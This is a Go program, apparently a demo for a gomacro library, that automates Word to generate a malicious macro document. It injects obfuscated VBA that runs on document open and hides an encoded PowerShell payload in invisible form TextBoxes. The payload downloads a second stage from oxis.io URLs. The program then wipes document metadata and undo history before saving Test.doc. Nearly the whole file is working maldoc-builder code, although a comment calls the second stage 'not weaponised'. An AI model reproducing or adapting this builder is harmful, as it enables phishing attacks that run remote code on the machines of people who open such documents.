// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"path"
	"strconv"
	"strings"

	"golang.org/x/text/encoding/unicode"

	"github.com/oxis/gomacro/pkg/gomacro"
	"github.com/oxis/gomacro/pkg/obf"
	"github.com/oxis/gomacro/resources"
)

// add a TextBox with custom properties
func addTextBox(n int, name string, text string, newForm *gomacro.Form) int {

	newForm.Add("forms.textbox.1", name)
	newForm.GetElement(name).SetProperty("Text", text)
	newForm.GetElement(name).SetProperty("Height", 0)
	newForm.GetElement(name).SetProperty("Width", 0)
	newForm.GetElement(name).SetProperty("PasswordChar", "C")
	newForm.GetElement(name).SetProperty("Enabled", false)

	n++
	return n
}

// add a Label with custom properties
func addLabel(n int, name string, text string, newForm *gomacro.Form) int {

	newForm.Add("forms.label.1", name)
	newForm.GetElement(name).SetProperty("Caption", text)
	newForm.GetElement(name).SetProperty("Height", 0)
	newForm.GetElement(name).SetProperty("Width", 0)
	newForm.GetElement(name).SetProperty("Enabled", false)

	n++
	return n
}

// setupForm takes a map of maps, extracts TextBox, Label and PSPayload and create the differnt form items.
// Also replaces references to those items inside the code
func setupForm(strList map[string]map[int]string, nameMap map[string]string, newForm *gomacro.Form, code string) string {

	for n, value := range strList["TextBox"] {
		nameMap[fmt.Sprintf("TextBox%v", n)] = obf.RandWord()
		fmt.Printf("TextBox%v text is %s\n", n, value)
		n = addTextBox(n, nameMap[fmt.Sprintf("TextBox%v", n)], value, newForm)
	}

	for n, value := range strList["PSPayload"] {
		nameMap["PSPayload"] = obf.RandWord()
		fmt.Printf("PSPayload text is %s\n", value)
		n = addTextBox(n, nameMap["PSPayload"], value, newForm)
	}

	for n, value := range strList["Label"] {
		nameMap[fmt.Sprintf("Label%v", n)] = obf.RandWord()
		fmt.Printf("Label%v text is %s\n", n, value)
		n = addLabel(n, nameMap[fmt.Sprintf("Label%v", n)], value, newForm)
	}

	for old, new := range nameMap {
		fmt.Printf("Replacing %s with %s\n", old, new)
		code = strings.ReplaceAll(code, old, new)
	}

	return code
}

// encode substract offset from char and add a separator between each char
// ex: offset = 1, sep = 'x', HELLO -> GxDxKxKxN
func encode(str string, offset string, sep string) string {

	offset2, _ := strconv.Atoi(offset)

	ret := ""
	for _, i := range str {
		ret += fmt.Sprint(int(i)-offset2) + sep
	}

	return ret[:len(ret)-len(sep)]
}

// newEncodedPSScript returns a UTF16-LE, base64 encoded script.
// The -EncodedCommand parameter expects this encoding for any base64 script we send over.
func newEncodedPSScript(script string) (string, error) {
	uni := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM)
	encoded, err := uni.NewEncoder().String(script)
	if err != nil {
		return "", err
	}

	var encodedNull []byte = make([]byte, len(encoded)*2)
	for _, c := range encoded {
		encodedNull = append(encodedNull, byte(c), 0x00)
	}

	return base64.StdEncoding.EncodeToString([]byte(encoded)), nil
}

func main() {
	// Initialise the lib
	gomacro.Init()
	defer gomacro.Uninitialize()

	// Open Word and get a hendle to documents
	documents := gomacro.NewDocuments(false)
	defer documents.Close()

	fmt.Printf("Word version is %s\n", documents.Application.Version)
	currpath, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(currpath)

	// Add a new document
	document := documents.AddDocument()

	// Set the name of the new doc
	document.VBProject.SetName(obf.RandWord())

	// Get a handle "ThisDocument" VBA project
	thisDoc, err := document.VBProject.VBComponents.GetVBComponent("ThisDocument")
	if err != nil {
		fmt.Printf("%s", err)
		document.Save()
		documents.Close()
	}

	// Rename it
	thisDoc.SetName(obf.RandWord())

	// Obfuscate VBA code found in "resources"
	code, funcMap, paramMap, varMap, stringMap := obf.ObfuscateVBCode(resources.EntryPointFunction, true, true, true, true)
	code2, funcMap2, paramMap2, varMap2, stringMap2 := obf.ObfuscateVBCode(resources.StringDecryptFunction, true, true, true, false)

	// Replace all func, param, var and string to obfuscated version
	code = obf.ReplaceAllInCode(fmt.Sprintf("%v\n%v", code, code2), funcMap, paramMap, varMap, stringMap)
	code = obf.ReplaceAllInCode(code, funcMap2, paramMap2, varMap2, stringMap2)

	// Document_Open() func is here
	docOpen := fmt.Sprintf(resources.DocumentOpen, obf.RandWord())
	docOpen = strings.ReplaceAll(docOpen, "EntryPoint", funcMap["EntryPoint"])

	// Add it to the project
	thisDoc.CodeModule.AddFromString(docOpen)

	// Create a map to hold form name and obfuscated version
	var nameMap map[string]string = make(map[string]string)

	// "UserForm1" -> random
	nameMap["UserForm1"] = obf.RandWord()
	// Add a new form and set random caption
	newForm := document.VBProject.VBComponents.AddNewForm(nameMap["UserForm1"])
	newForm.SetProperty("Caption", obf.RandWord())

	// Setup second stage, not weaponised
	resources.Payload = fmt.Sprintf(resources.Payload, "https://oxis.io/web/a", "https://oxis.io/web/p")
	b64Payload, _ := newEncodedPSScript(resources.Payload)
	// Using varMap because of Drim PowershellCopy, this is to replace all occurence of that string.
	resources.PSPayload = strings.ReplaceAll(resources.PSPayload, "powershellCopy", varMap["powershellCopy"])
	finalPayload := fmt.Sprintf(resources.PSPayload, b64Payload)

	// this map contains TextBox, Label and the payload, each associated to an encoded string. strMap["Label"][0] refers to "Label0" inside the VBA project.
	strMap := map[string]map[int]string{
		"PSPayload": {0: encode(finalPayload, resources.Offset, resources.Sep)},
		"Label": {1: resources.Offset, // Label1 is Offset
			2: resources.Sep}, // Label2 is Sep
	}

	// Setup the form with Labels and TexBoxes
	code = setupForm(strMap, nameMap, newForm, code)

	// Add a new module with random name
	newModule := document.VBProject.VBComponents.AddVBComponent(obf.RandWord(), gomacro.MODULE)
	// code is obfuscated version of the code in "resources"
	newModule.CodeModule.AddFromString(code)

	// Some cleanup
	document.Application.Options.SetOption("Pagination", false)
	document.Repaginate()
	document.Application.SetOption("ScreenUpdating", true)
	document.Application.ScreenRefresh()

	// Wipe doc infos
	document.RemoveDocumentInformation(99)
	// Can't go back
	document.UndoClear()
	// Save and close

	document.SaveAs(path.Join(currpath, "Test.doc"))
	documents.Save()
}
